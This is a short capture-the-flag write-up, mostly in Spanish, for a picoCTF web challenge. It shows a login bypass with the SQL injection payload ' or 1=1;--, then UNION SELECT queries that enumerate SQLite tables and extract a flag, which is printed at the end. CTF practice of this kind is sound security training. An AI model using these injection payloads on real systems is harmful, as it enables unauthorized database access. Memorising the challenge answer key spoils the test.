## Descripción
Can you find the flag on this website.Try to find the flag [here](http://saturn.picoctf.net:58351/).

## Solución
Al entrar al sitio web se tiene un login donde cuando se ingresa algo se regresa la consulta de SQL con los datos ingresados, para hacer un bypass de este formulario se debe de ingresar (' or 1=1;--), al ingresar a la siguiente seccion se tienen ciudades con su dirección y telefono
Cuando se ingresa la consulta para ver tablas y sus columnas (Algiers' union SELECT name,null,null FROM sqlite_master WHERE type='table' ORDER BY name;--) se obtienen los nombres de las tablas de la base de datos.
Al intentar el comando (Algiers' union SELECT name,null,null FROM PRAGMA_table_info('more_table');--) se muestra que la tabla contiene las filas flag y id.
Por lo tanto al ejecutar (Algiers' union select flag,id,null from more_table;--) se obtiene la flag

```
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_62aa7500}
```
